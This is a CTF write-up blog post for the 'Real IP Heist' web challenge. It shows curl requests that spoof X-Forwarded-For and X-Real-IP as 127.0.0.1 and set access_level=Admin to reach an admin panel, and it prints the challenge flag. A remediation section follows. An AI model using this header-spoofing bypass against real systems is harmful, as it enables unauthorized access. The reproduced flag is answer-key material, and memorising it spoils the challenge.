---
title: "🔓 Real IP Heist"
layout: post
collection: writeups
permalink: /writeups/safaricom-real-ip-heist/
date: 2025-10-04
categories: ["Writeups", "Safaricom PwnZone"]
tags: [web, headers, pwnzone]
image: /assets/images/writeups/real-ip-heist/safaricom-real-ip-heist.jpg
thumbnail: /assets/images/writeups/real-ip-heist/safaricom-real-ip-heist.jpg
icon: fas fa-network-wired
excerpt: "Abused trust in X-Forwarded-For / X-Real-IP headers to escalate access and retrieve the flag."
description: "Exploit of server trusting client-supplied X-Forwarded-For/X-Real-IP headers, obtaining Admin access and the flag."
---

![Real IP Heist Screenshot](/assets/images/writeups/real-ip-heist/safaricom-real-ip-heist.jpg)

# Real IP Heist — Challenge Writeup

## Challenge Overview

* **Challenge Name:** Real IP Heist
* **Target URL:** `http://54.72.82.22:8085`
* **Description:** "Ever wonder what your network really reveals about you. Not everything is as anonymous as it seems..."

---

## Step-by-Step Solution

### 1. Initial Reconnaissance

Visited the target URL in a browser. The page displayed a simple login form with:

* Username (free text input)
* Access Level (dropdown with only "User" available)
* Login button

![Login Form Screenshot](/assets/images/writeups/real-ip-heist/TargetIP.png)

### 2. Analyzing Client-Side Restrictions

Inspected the page source and network activity using browser developer tools. Discovered that client-side JavaScript was setting a fixed `X-Forwarded-For` header, limiting users to "User" access level regardless of input.

![Page Source Screenshot](/assets/images/writeups/real-ip-heist/View-Page-Source.png)

![Source Code Screenshot](/assets/images/writeups/real-ip-heist/Source-code.png)

### 3. Bypassing Client-Side Restrictions

The server appeared to trust HTTP headers for IP verification. I bypassed client-side restrictions using `curl` to send custom requests with spoofed headers.

### 4. First curl Request — Gaining Admin Access

Crafted a `curl` command to:

* Send a POST request to the login endpoint
* Override the `X-Forwarded-For` header to simulate an internal IP (`127.0.0.1`)
* Set the `access_level` parameter to `Admin` directly in POST data

```bash
curl -X POST 'http://54.72.82.22:8085/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  --data 'username=attacker&access_level=Admin'
```

**Response:**

```html
<h2>Hello, attacker</h2>
<!-- real admin use internal tools -->
<p>Access level: Admin</p>
<p><a href="/admin">Go to admin panel</a></p>
```

### 5. Second curl Request — Accessing Admin Panel

The response revealed an `/admin` endpoint. Sent another request with both spoofed headers:

```bash
curl -X GET 'http://54.72.82.22:8085/admin' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -H 'X-Real-IP: 127.0.0.1'
```

**Response:**

```html
<h3>Welcome, admin!</h3>
<p>Flag: safctf{c0f1ec1fccb2de4a03031037251f21a7}</p>
```

![Page Source Screenshot](/assets/images/writeups/real-ip-heist/Curl.png)

## Vulnerability Analysis

**Critical Security Flaw:** The application trusted client-supplied headers for authentication decisions.

**Specific Issues:**

* Server used `X-Forwarded-For` and `X-Real-IP` headers to verify internal/trusted IPs.
* Spoofing headers to `127.0.0.1` bypassed access controls.
* `access_level` parameter was vulnerable to direct manipulation.
* Client-side restrictions provided a false sense of security.

## Flag

```
safctf{c0f1ec1fccb2de4a03031037251f21a7}
```

![Page Source Screenshot](/assets/images/writeups/real-ip-heist/Flag.png)

## Key Takeaways

* Never trust client-supplied headers for security decisions.
* Client-side restrictions are easily bypassed and should not be relied upon for access control.
* Always validate authentication and authorization on the server side.
* IP-based authentication can be vulnerable to header injection attacks.
* Security through obscurity (hidden admin endpoints) is not effective protection.

## Remediation Recommendations (brief)

1. Do not rely on `X-Forwarded-For` or other client-controllable headers for trust decisions. Implement server-side checks using trusted sources (e.g., internal firewall, verified reverse proxy that strips/sets these headers).
2. Validate and enforce `access_level` server-side; do not accept privilege escalation via POST parameters.
3. Implement proper authentication/authorization controls (session tokens, role checks) that cannot be manipulated from the client.
4. Harden server by ensuring only trusted proxies can set forwarding headers and by validating the source ASN/IP ranges where appropriate.
5. Log and monitor suspicious header manipulations and failed attempts.

---

## Notes

* All testing described above was performed in the context of the CTF challenge as provided by the target URL.

